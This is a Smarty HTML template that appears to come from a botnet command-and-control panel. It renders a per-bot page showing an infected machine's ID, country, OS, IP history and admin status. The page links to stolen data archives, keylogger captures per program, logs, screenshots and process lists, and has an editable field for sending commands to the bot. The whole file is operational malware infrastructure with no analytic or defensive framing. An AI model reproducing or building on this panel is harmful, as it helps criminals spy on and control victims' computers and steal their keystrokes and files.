{if $nobot eq true}
<hr />
<h2 align="center">{$lang.botnotfound}</h2>
<hr />
{if $bot_uid}
<div style="text-align:center">
{$lang.nbsdpre}
<br />
<a href="/bots/bot-{$bot_uid->id}.html">{$lang.posmtr}</a>
</div>
<hr />
{/if}
{else}
<form name="groups" id="groups">
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp2">
    <th style="text-align: left; width: 300px;">{$lang.uid}</th>
    <th style="text-align: left;">{$bot->prefix}{$bot->uid}</th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.country}</th>
    <th style="text-align: left;">{$bot->country}</th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.os}</th>
    <th style="text-align: left;">{$bot->os}</th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.ver}</th>
    <th style="text-align: left;">{$bot->ver}</th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.ip}</th>
    <th style="text-align: left;">{$bot->ip}</th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.perots}</th>
    <th style="text-align: left;">{$bot->post_date}</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.poslot}</th>
    <th style="text-align: left;">{$bot->last_date}</th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.minvmo}</th>
    <th style="text-align: left;">{$bot->min_post}</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.maxvmo}</th>
    <th style="text-align: left;">{$bot->max_post}</th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.vjib}</th>
    <th style="text-align: left;">{$bot->live_time_bot}</th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.admin}</th>
    <th style="text-align: left;">{if $bot->admin eq 1}{$lang.yes}{else}{$lang.no}{/if}</th>
</tr>
{if $bot->hunter ne ''}
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.hunter}</th>
    <th style="text-align: left;">{$bot->hunter}</th>
</tr>
{/if}
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.comment}{if $_SESSION['user']->access['bots']['save_comment'] eq 'on'} <a href="#" onclick="edit_comment_b(this.parentNode.parentNode.cells[1], 'groups', '10');"><img src="/images/edit.png" alt="{$lang.edit}" /></a>{/if}</th>
    <th style="text-align: left;{if $bot->comment|strpos:"!" ne 0}color:#F00{/if}" id="cg_{$bot->id}_10" onclick="return false;">{$bot->comment}</th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.lickom}{if $_SESSION['user']->access['bots']['jobs_bot_edit'] eq 'on'} <a href="#" onclick="edit_bot_cmd_b(this.parentNode.parentNode, '{$bot->id}');"><img src="/images/edit.png" alt="{$lang.edit}" /></a>{/if}</th>
    <th style="text-align: left;" id="cmdcell{$bot->id}">{$bot->cmd}</th>
</tr>
</table>
{if $bot->ips|@count >= 1}
<hr />
<h2 align="center">{$lang.listip}</h2>
<hr />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;" align="center">
<tr class="bgp3">
    <th>{$lang.ip}</th>
    <th width="20%">{$lang.country}</th>
    <th width="30%">{$lang.data}</th>
</tr>
{foreach from=$bot->ips item=ip name=ips}
{if $smarty.foreach.ips.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th>{$ip->ip}</th>
    <th>{$ip->country}</th>
    <th>{$ip->post_date}</th>
</tr>
{/foreach}
</table>
{/if}
{if $bot->cabs}
<hr />
<h2 align="center">{$lang.listcab}</h2>
<hr />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc; text-align:center">
<tr class="bgp3" style="font-size:10px">
    <th style="width:100px">{$lang.type}</th>
    <th>{$lang.comment}</th>
    <th style="width:80px">{$lang.files}</th>
    <th style="width:80px">{$lang.data}</th>
    <th style="width:20px">&nbsp;</th>
</tr>
{foreach from=$bot->cabs item=cab name=cabs}
{if $smarty.foreach.cabs.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th>{$cab_desc[$cab->type]}</th>
    <th style="cursor:pointer;{if $cab->comment|strpos:"!" ne 0}color:#F00{/if}" onclick="return false;" id="cg_{$bot->id}_{$cab->type}" ondblclick="edit_comment_b(this, 'groups', '{$cab->type}');">{$cab->comment}</th>
    <th>{$cab->count}</th>
    <th>{$cab->post_date|date_format:"%d-%m-%Y"}</th>
    <th><a href="/logs/download-10.html?str={$cab->prefix}{$cab->uid}&amp;file={$cab->type}" target="_blank"><img src="/images/icons/icon_download.gif" title="{$lang.svdds}" alt="{$lang.download}" border="0" /></a></th>
</tr>
{/foreach}
</table>
<hr />
{/if}
{if $bot->keylog}
<hr />
<h2 align="center">{$lang.listkeylog}</h2>
<hr />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc; text-align:center">
<tr class="bgp3" style="font-size:10px">
    <th style="width:100px">{$lang.progs}</th>
    <th>{$lang.comment}</th>
    <th style="width:80px">{$lang.count}</th>
    <th style="width:80px">{$lang.data}</th>
    <th style="width:20px">&nbsp;</th>
</tr>
{foreach from=$bot->keylog item=keylog name=keylogs}
{if $smarty.foreach.keylogs.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
   <th>{$keylog->name}</th>
    <th style="cursor:pointer;{if $cab->comment|strpos:"!" ne 0}color:#F00{/if}" onclick="return false;" id="cg_{$bot->id}_{$keylog->hash}" ondblclick="edit_comment_b(this, 'groups', '9');">{$cab->comment}</th>
    <th>{$keylog->count}</th>
    <th>{$keylog->post_date|date_format:"%d-%m-%Y"}</th>
    <th><a href="/keylog/hash.html?str={$keylog->hash}&amp;x={$bot->prefix}{$bot->uid}" target="_blank"><img src="/images/icons/box.gif" title="{$lang.posmtr}" alt="{$lang.posmtr}" border="0" /></a></th>
</tr>
{/foreach}
</table>
<hr />
{/if}
{if $bot->logs}
<hr />
<h2 align="center">{$lang.listlog}</h2>
<hr />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc; text-align:center">
<tr class="bgp{$bg}" style="font-size:10px">
    <th>{$lang.nazvfi}</th>
    <th colspan="2" style="width:30%">&nbsp;</th>
  </tr>
{foreach from=$bot->logs item=log name=logs}
{if $smarty.foreach.logs.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th>{$log}</th>
   <th><a href="/logs/download-5.html?str={$bot->prefix}&name={$bot->uid}&file={$log}" target="_blank">{$lang.posmtr}</a></th>
   <th><a href="/logs/download-5.html?str={$bot->prefix}&name={$bot->uid}&file={$log}&type=1" target="_blank">{$lang.download}</a></th>
</tr>
{/foreach}
</table>
<hr />
{/if}
{if $bot->heaps}
<hr />
<h2 align="center">{$lang.slheap}</h2>
<hr />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc; text-align:center">
<tr class="bgp{$bg}" style="font-size:10px">
    <th>{$lang.nazvfi}</th>
    <th colspan="2" style="width:30%">&nbsp;</th>
  </tr>
{foreach from=$bot->heaps item=log name=heaps}
{if $smarty.foreach.heaps.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th>{$log}</th>
   <th><a href="/logs/download-5.html?str={$bot->prefix}&name={$bot->uid}&file={$log}" target="_blank">{$lang.posmtr}</a></th>
   <th><a href="/logs/download-5.html?str={$bot->prefix}&name={$bot->uid}&file={$log}&type=1" target="_blank">{$lang.download}</a></th>
</tr>
{/foreach}
</table>
<hr />
{/if}
{if $bot->screens}
<hr />
<h2 align="center">{$lang.listscreen}</h2>
<hr />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc; text-align:center">
<tr class="bgp{$bg}" style="font-size:10px">
    <th>{$lang.nazvfi}</th>
    <th style="width:30%;">{$lang.data}</th>
</tr>
{foreach from=$bot->screens item=screen name=screens}
{if $smarty.foreach.screens.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th><a href="/logs/download-8.html?file={$screen->file}" target="_blank">{$screen->file}</a></th>
    <th>{$screen->post_date}</th>
</tr>
{/foreach}
</table>
<hr />
{/if}
{if $bot->plist|@count >= 1}
<hr />
<h2 align="center">{$lang.listproc}</h2>
<hr />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc; text-align:left">
{foreach from=$bot->plist item=plist name=plist}
{if $smarty.foreach.plist.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th>{$plist}</th>
</tr>
{/foreach}
</table>
{/if}
</form>
{/if}
<br />